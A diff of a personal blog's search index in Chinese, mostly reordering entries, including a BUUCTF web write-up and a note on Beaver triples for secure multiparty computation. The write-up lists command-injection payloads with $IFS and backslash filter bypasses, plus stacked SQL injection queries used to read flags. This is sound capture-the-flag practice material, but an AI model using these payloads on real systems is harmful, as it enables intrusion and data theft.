@@ -463,54 +463,6 @@ DOM 监听：MutationObserver 监听动态元素，实时更新样式
       </tags>
   </entry>
   <entry>
-    <title>BUUCTF Web wp</title>
-    <url>/2024/08/16/BUUCTF-Web-wp/</url>
-    <content><![CDATA[[ACTF2020 新生赛]Exec
-输入127.0.0.1;ls
-
-发现真的把 index.php（也就是ls的操作结果）真的输出了，说明没有过滤分号
-最终在127.0.0.1;cd ../../../;ls找到了flag文件
-
-输入127.0.0.1;cd ../../../;ls得到flag
-
-flag:flag&#123;4e3b851f-9a72-42c9-a57a-d6698548cdc0&#125;
-[GXYCTF2019]Ping Ping Ping发现有一个/?ip=
-根据上一题的经验，我们输入/?ip=127.0.0.1;ls，得到
-
-得知不能输入空格
-
-所以我们需要绕过空格使用一下平替
-$&#123;IFS&#125;$9&#123;IFS&#125;$IFS$&#123;IFS&#125;$IFS$1 //$1改成$加其他数字貌似都行IFS&lt; &lt;&gt; &#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来%20   (space)%09   (tab)X=$&#x27;cat\x09./flag.php&#x27;;$X       （\x09表示tab，也可以用\x20）
-输入/?ip=127.0.0.1;cat$IFS1flag.php
-
-我们查看index.php
-
-使用 /?ip=127.0.0.1;e=g;cat$IFS$1fla$e.php
-F12即可得到flag
-
-;     前面的执行完执行后面的|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         ||    当前面的执行出错时（为假）执行后面的&amp;     将任务置于后台执行&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真%0a  （换行）%0d  （回车）---ps:有时会禁用cat:解决方法是使用tac反向输出命令：linux命令中可以加\，所以甚至可以ca\t /fl\ag---?ip=127.0.0.1;cat$IFS$9`ls`$IFS在Linux下表示为空格$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字这里$IFS$9或$IFS垂直，后面加个$与&#123;&#125;类似，起截断作用
-flag:flag&#123;ef88dbb0-2c4d-4489-9fdb-02ce4c5d6fa1&#125;
-[SUCTF 2019]EasySQL
-堆叠注入查询数据库
-1; show databases;
-
-查询表名
-
-1;show columns from Flag;#select $_GET[&#x27;query&#x27;] || flag from flag
-尝试访问Flag，发现不行
-输入*,1
-
-这里的原理是sql=select.post[‘query’].&quot;||flag from Flag&quot;;如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。这里说一下我的理解这里输入*,1,这里会增加一个临时列，他的列名为1，然后那一列的值都为1。当我们只关心数据表有多少记录行而不需要知道具体的字段值时，类似“select 1 from tblName”是一个很不错的SQL语句写法，它通常用于子查询。这样可以减少系统开销，提高运行效率，因为这样子写的SQL语句，数据库引擎就不会去检索数据表里一条条具体的记录和每条记录里一个个具体的字段值并将它们放到内存里，而是根据查询到有多少行存在就输出多少个“1”，每个“1”代表有1行记录，同时选用数字1还因为它所占用的内存空间最小，当然用数字0的效果也一样。在不需要知道具体的记录值是什么的情况下这种写法无疑更加可取。
-flag:flag&#123;70066add-3cd0-49ec-84b3-8e6ee05c3dd9&#125;
-[强网杯 2019]随便注]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BUUCTF RE wp</title>
     <url>/2024/08/13/BUUCTF-RE-wp/</url>
     <content><![CDATA[easyre
@@ -587,62 +539,51 @@ flag:flag&#123;i_l0ve_you&#125;
       </tags>
   </entry>
   <entry>
-    <title>Beaver三元组用于乘法共享</title>
-    <url>/2025/04/10/Beaver%E4%B8%89%E5%85%83%E7%BB%84%E7%94%A8%E4%BA%8E%E4%B9%98%E6%B3%95%E5%85%B1%E4%BA%AB/</url>
-    <content><![CDATA[Beaver 三元组（Beaver triples）是安全多方计算（MPC）中一个超级聪明、实用的技巧，用来安全地做乘法
-通俗类比：就好像你和朋友要乘两个私密数字，但你们提前准备了一个万能“乘法模板”，可以安全又正确地偷偷算出结果。
+    <title>BUUCTF Web wp</title>
+    <url>/2024/08/16/BUUCTF-Web-wp/</url>
+    <content><![CDATA[[ACTF2020 新生赛]Exec
+输入127.0.0.1;ls
 
+发现真的把 index.php（也就是ls的操作结果）真的输出了，说明没有过滤分号
+最终在127.0.0.1;cd ../../../;ls找到了flag文件
 
-Motivation在安全多方计算里：
+输入127.0.0.1;cd ../../../;ls得到flag
 
-加法很容易做：每个人把自己数据碎片加一下就行。
-但乘法就麻烦了，因为：
-两个秘密数的乘积不能直接从碎片算
-又不能暴露真实数值
-所以需要巧妙地”绕过去“
+flag:flag&#123;4e3b851f-9a72-42c9-a57a-d6698548cdc0&#125;
+[GXYCTF2019]Ping Ping Ping发现有一个/?ip=
+根据上一题的经验，我们输入/?ip=127.0.0.1;ls，得到
 
+得知不能输入空格
 
+所以我们需要绕过空格使用一下平替
+$&#123;IFS&#125;$9&#123;IFS&#125;$IFS$&#123;IFS&#125;$IFS$1 //$1改成$加其他数字貌似都行IFS&lt; &lt;&gt; &#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来%20   (space)%09   (tab)X=$&#x27;cat\x09./flag.php&#x27;;$X       （\x09表示tab，也可以用\x20）
+输入/?ip=127.0.0.1;cat$IFS1flag.php
 
-Beaver 三元组应运而生
+我们查看index.php
 
-DefinationBeaver 三元组表示为：
+使用 /?ip=127.0.0.1;e=g;cat$IFS$1fla$e.php
+F12即可得到flag
 
-(a, b, c) \quad \text{where} \quad c = a \cdot b
-所有参与方各自拿到这些数的“碎片”，但不知道完整的值。
-它跟我们真正要计算的 $x \cdot y$ 没有关系，只是一个通用的乘法工具。
+;     前面的执行完执行后面的|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         ||    当前面的执行出错时（为假）执行后面的&amp;     将任务置于后台执行&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真%0a  （换行）%0d  （回车）---ps:有时会禁用cat:解决方法是使用tac反向输出命令：linux命令中可以加\，所以甚至可以ca\t /fl\ag---?ip=127.0.0.1;cat$IFS$9`ls`$IFS在Linux下表示为空格$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字这里$IFS$9或$IFS垂直，后面加个$与&#123;&#125;类似，起截断作用
+flag:flag&#123;ef88dbb0-2c4d-4489-9fdb-02ce4c5d6fa1&#125;
+[SUCTF 2019]EasySQL
+堆叠注入查询数据库
+1; show databases;
 
+查询表名
 
-Algorithm假设两位参与方想计算：
+1;show columns from Flag;#select $_GET[&#x27;query&#x27;] || flag from flag
+尝试访问Flag，发现不行
+输入*,1
 
-x \cdot y但每人都只知道自己的秘密（$x$ 或 $y$），又不想泄露给别人。
-
-步骤如下：
-
-每人拿到 $x$ 和 $y$ 的秘密共享，还有一个 Beaver 三元组 $(a, b, c)$，满足 $c = ab$
-
-本地计算（在共享上进行）：
-
-
-
-\begin{align}
-&d = x - a\\
-&e = y - b
-\end{align}
-公布 $d$ 和 $e$（这不会泄露 $x$ 和 $y$，因为 $a$ 和 $b$ 是随机的）
-
-使用下面的公式计算结果：
-
-
-
-xy = c + d \cdot b + e \cdot a + d \cdot e
-安全性说明：
-虽然你公开了 $d$ 和 $e$，但由于 $a$ 和 $b$ 是随机数，别人无法反推 $x$ 和 $y$，同时这个公式仍能计算出准确的乘积
-]]></content>
+这里的原理是sql=select.post[‘query’].&quot;||flag from Flag&quot;;如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。这里说一下我的理解这里输入*,1,这里会增加一个临时列，他的列名为1，然后那一列的值都为1。当我们只关心数据表有多少记录行而不需要知道具体的字段值时，类似“select 1 from tblName”是一个很不错的SQL语句写法，它通常用于子查询。这样可以减少系统开销，提高运行效率，因为这样子写的SQL语句，数据库引擎就不会去检索数据表里一条条具体的记录和每条记录里一个个具体的字段值并将它们放到内存里，而是根据查询到有多少行存在就输出多少个“1”，每个“1”代表有1行记录，同时选用数字1还因为它所占用的内存空间最小，当然用数字0的效果也一样。在不需要知道具体的记录值是什么的情况下这种写法无疑更加可取。
+flag:flag&#123;70066add-3cd0-49ec-84b3-8e6ee05c3dd9&#125;
+[强网杯 2019]随便注]]></content>
       <categories>
-        <category>科研</category>
+        <category>CTF</category>
       </categories>
       <tags>
-        <tag>Crypto</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -861,6 +802,65 @@ flagflag&#123;RSA_from_ikea_is_fun_but_insecure#k20944uehdjfnjd335uro&#125;
       <tags>
         <tag>cryptoCTF</tag>
         <tag>常驻</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Beaver三元组用于乘法共享</title>
+    <url>/2025/04/10/Beaver%E4%B8%89%E5%85%83%E7%BB%84%E7%94%A8%E4%BA%8E%E4%B9%98%E6%B3%95%E5%85%B1%E4%BA%AB/</url>
+    <content><![CDATA[Beaver 三元组（Beaver triples）是安全多方计算（MPC）中一个超级聪明、实用的技巧，用来安全地做乘法
+通俗类比：就好像你和朋友要乘两个私密数字，但你们提前准备了一个万能“乘法模板”，可以安全又正确地偷偷算出结果。
+
+
+Motivation在安全多方计算里：
+
+加法很容易做：每个人把自己数据碎片加一下就行。
+但乘法就麻烦了，因为：
+两个秘密数的乘积不能直接从碎片算
+又不能暴露真实数值
+所以需要巧妙地”绕过去“
+
+
+
+Beaver 三元组应运而生
+
+DefinationBeaver 三元组表示为：
+
+(a, b, c) \quad \text{where} \quad c = a \cdot b
+所有参与方各自拿到这些数的“碎片”，但不知道完整的值。
+它跟我们真正要计算的 $x \cdot y$ 没有关系，只是一个通用的乘法工具。
+
+
+Algorithm假设两位参与方想计算：
+
+x \cdot y但每人都只知道自己的秘密（$x$ 或 $y$），又不想泄露给别人。
+
+步骤如下：
+
+每人拿到 $x$ 和 $y$ 的秘密共享，还有一个 Beaver 三元组 $(a, b, c)$，满足 $c = ab$
+
+本地计算（在共享上进行）：
+
+
+
+\begin{align}
+&d = x - a\\
+&e = y - b
+\end{align}
+公布 $d$ 和 $e$（这不会泄露 $x$ 和 $y$，因为 $a$ 和 $b$ 是随机的）
+
+使用下面的公式计算结果：
+
+
+
+xy = c + d \cdot b + e \cdot a + d \cdot e
+安全性说明：
+虽然你公开了 $d$ 和 $e$，但由于 $a$ 和 $b$ 是随机数，别人无法反推 $x$ 和 $y$，同时这个公式仍能计算出准确的乘积
+]]></content>
+      <categories>
+        <category>科研</category>
+      </categories>
+      <tags>
+        <tag>Crypto</tag>
       </tags>
   </entry>
   <entry>
@@ -8062,19 +8062,6 @@ https://github.com/azl397985856/cf
       </tags>
   </entry>
   <entry>
-    <title>计算机组成原理学习笔记</title>
-    <url>/2025/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[
-
-]]></content>
-      <categories>
-        <category>考研</category>
-      </categories>
-      <tags>
-        <tag>考研专业课</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>荔枝橙味拱腰觅马糕守</title>
     <url>/2024/09/11/%E8%8D%94%E6%9E%9D%E6%A9%99%E5%91%B3%E6%8B%B1%E8%85%B0%E8%A7%85%E9%A9%AC%E7%B3%95%E5%AE%88/</url>
     <content><![CDATA[本篇文章旨在记录笔者阅读《公钥密码方案构造及安全证明的知识要点和方法论》的学习总结和收获
@@ -8712,8 +8699,21 @@ $Decrypt:(SP,pk,M,CT)\rightarrow M/\perp$，其中，$\perp$ 代表解密失败
         <category>科研</category>
       </categories>
       <tags>
-        <tag>Crypto</tag>
         <tag>常驻</tag>
+        <tag>Crypto</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>计算机组成原理学习笔记</title>
+    <url>/2025/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[
+
+]]></content>
+      <categories>
+        <category>考研</category>
+      </categories>
+      <tags>
+        <tag>考研专业课</tag>
       </tags>
   </entry>
   <entry>
